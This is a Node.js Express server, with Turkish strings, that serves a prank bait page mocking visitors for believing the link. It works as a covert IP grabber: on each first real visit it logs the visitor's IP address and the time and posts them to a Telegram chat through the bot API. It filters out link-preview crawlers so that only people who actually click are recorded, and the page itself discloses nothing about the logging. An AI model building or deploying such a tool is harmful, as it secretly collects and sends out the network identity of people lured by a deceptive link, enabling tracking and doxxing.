require("dotenv").config();
const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;

app.set("trust proxy", true);

const seenIps = new Set();

function getClientIp(req) {
  let ip = req.ip || req.socket.remoteAddress || "";

  if (ip.startsWith("::ffff:")) {
    ip = ip.slice(7);
  }

  return ip;
}

function isPreviewOrBot(req) {
  const ua = (req.get("user-agent") || "").toLowerCase();

  const botWords = [
    "telegrambot",
    "facebookexternalhit",
    "facebot",
    "twitterbot",
    "whatsapp",
    "discordbot",
    "googlebot",
    "bingbot",
    "linkedinbot",
    "slackbot",
    "crawler",
    "spider",
    "preview",
    "bot"
  ];

  return botWords.some(word => ua.includes(word));
}

async function sendTelegram(message) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.log("Telegram ayarları eksik.");
    return;
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });

  if (!response.ok) {
    console.error("Telegram hatası:", await response.text());
  }
}

app.get("/", async (req, res) => {
  const ip = getClientIp(req);

  const time = new Date().toLocaleString("tr-TR", {
    timeZone: "Europe/Istanbul"
  });

  if (!isPreviewOrBot(req) && ip && !seenIps.has(ip)) {
    seenIps.add(ip);

    const message = `🌐 Yeni ziyaretçi

IP: ${ip}
Saat: ${time}`;

    console.log(message);

    await sendTelegram(message);
  }

  res.send(`<!DOCTYPE html>
<html lang="tr">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>:)</title>

<style>
* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  width: 100%;
  min-height: 100%;
}

body {
  background: white;
  color: black;
  font-family: Arial, sans-serif;
  min-height: 100vh;

  display: flex;
  justify-content: center;
  align-items: center;

  text-align: center;
}

.content {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 25px;
  padding: 20px;
}

h1 {
  margin: 0;
  font-size: clamp(28px, 5vw, 56px);
  font-weight: 600;
}

img {
  max-width: 90vw;
  max-height: 65vh;
  width: auto;
  height: auto;
  display: block;
}
</style>

</head>

<body>

<div class="content">

<h1>nası inandın bilmiyorum:)</h1>

<img
src="https://i.pinimg.com/736x/d1/d6/89/d1d689d280015331b1a3954e784459b8.jpg"
alt="foto">
</div>

</body>

</html>`);
});

app.listen(PORT, () => {
  console.log(`Site http://localhost:${PORT} adresinde çalışıyor.`);
});
